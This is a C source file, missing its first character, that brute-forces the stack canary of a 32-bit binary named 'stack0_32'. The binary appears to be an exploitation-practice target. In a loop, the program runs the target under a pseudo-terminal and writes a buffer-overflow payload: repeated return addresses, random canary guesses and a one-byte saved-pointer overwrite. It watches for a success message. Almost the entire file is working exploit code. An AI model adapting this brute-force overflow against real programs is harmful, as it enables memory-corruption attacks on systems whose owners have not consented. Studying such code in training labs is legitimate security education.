nclude <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <pty.h>
#include <fcntl.h>
#include <time.h>
#include <sys/wait.h>

#define WAITMAX 10000

int master;

// handle SIGCHLD
void handle(int signum)
{
    char buffer1[256];
    char buffer2[256];
    int nread1 = 0;
    int nread2 = 0;
    // read the first output. Should be "Try again"
    nread1 = read(master, buffer1, 12);
    if(nread1>0) buffer1[nread1] = '\0';
    else buffer1[0] = '\0';

    // read the second output. Could be *** stack smash smashing detected or the success "modified" message
    nread2 = read(master, buffer2, sizeof(buffer2));
    if(nread2>0) buffer2[nread2] = '\0';
    else buffer2[0] = '\0';

    // if the second output starts with "you", we should have gotten the modified success message
    if(nread2>2 && (buffer2[0] == 'y' && buffer2[1] == 'o' && buffer2[2] == 'u')) {
        printf("\nSIG(%d) stdout1 (%d): \"%s\"\n", signum, nread1, buffer1);
        printf("\nSIG(%d) stdout2 (%d): \"%s\"\n", signum, nread2, buffer2);
        exit(0);
    }
}

int main(int argc, char* argv[]) {
    time_t start_time;
    int seed;
    int next_debug_msg;
    long exec_count;

    // check if a seed was specified
    if(argc<2) {
        printf("usage: %s <seed>\n",argv[0]);
        exit(1);
    }


    // seed the PRNG
    seed = atoi(argv[1]);
    srand(seed);

    // disable buffering for stdout
    setbuf(stdout, NULL);

    // define a signal handler to get notified when a child dies
    struct sigaction sigchld_action = { .sa_handler = handle, .sa_flags = SA_NOCLDWAIT };
    sigaction(SIGCHLD, &sigchld_action, NULL);

    // amount of execs when next message is shown
    next_debug_msg=1000;
    // remember start time to calculate execs per second
    start_time=time(NULL);
    // counting the executions
    exec_count=0;

    // a pretentious way to do a while(true) loop.
    for(;;) {
        // count the executions
        exec_count+=1;

        // create a new process and connect it to a pseudo terminal
        // this forces the target process to flush on newlines and we don't loose it because of "abort"
        pid_t pid = forkpty(&master, NULL, NULL, NULL);
        if(pid==-1) exit(1);

        // disable some terminal behaviour like echo input and behaviour of special characters ~(ECHO | ECHONL | ISIG);
        struct termios tios;
        tcgetattr(master, &tios);
        tios.c_lflag = 0; // disable all options
        tcsetattr(master, TCSANOW, &tios);

        if(!pid) {
            // the child: execute stack0 32bit
            char *argv[]={ "./stack0_32", 0};
            execv(argv[0], argv);
        } else {
            // the parent: send the buffer overflow payload

            // code redirect target
            // 0x080484cf <+68>:    push   $0x8048590
            // 0x080484d4 <+73>:    call   0x8048360 <puts@plt>
            // [0x080484cf][0x080484cf][0x080484cf]...[0x080484cf]|[cookie][padding][overwrite 1 byte of stored esp]
            unsigned char input[] = {0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0xcf, 0x84, 0x4, 0x8, 0x0, 0x41, 0x41, 0x41, 0x42, 0x42, 0x42, 0x42, 0xa, 0x0};

            // generate three random cookie bytes. (first byte stays 0x00)
            // make sure no newline is included because the target uses gets() and that would stop the input early
            do{ input[65] = (rand() % 256); } while (input[65]=='\n');
            do{ input[66] = (rand() % 256); } while (input[66]=='\n');
            do{ input[67] = (rand() % 256); } while (input[67]=='\n');

            // write the buffer overflow payload to the pseudo terminal
            write(master, input, sizeof(input));

            // check if the process should print current status
            if(exec_count%(next_debug_msg)==0) {
                printf("Process: %d | exec: %d (%ld/s) | last cookie: [%02x,%02x,%02x]\r", seed, exec_count, exec_count/((time(NULL)-start_time)), (unsigned char)input[65], (unsigned char)input[66], (unsigned char)input[67]);
                // use random to determine when the next message should be shown, to have each process print another time
                next_debug_msg = (rand() % WAITMAX)+1;
            }

            int status;
            int wait_ret;
            // check for the health of the child process in a loop
            for(int i=0;;i++) {
                wait_ret = waitpid(pid, &status, WNOHANG);
                // break the loop if the child is not running anymore. on to the next round!
                if(wait_ret==-1) break;
                // after the 10th wait send a kill to the child. maybe it's hanging.
                if(wait_ret==0 && i==10) kill(pid, SIGKILL);
                // sleep a short amount of time
                nanosleep((const struct timespec[]){{0, 10000000L}}, NULL);
            }
            // close the opened pseudo terminal
            close(master);
        }
    }
}
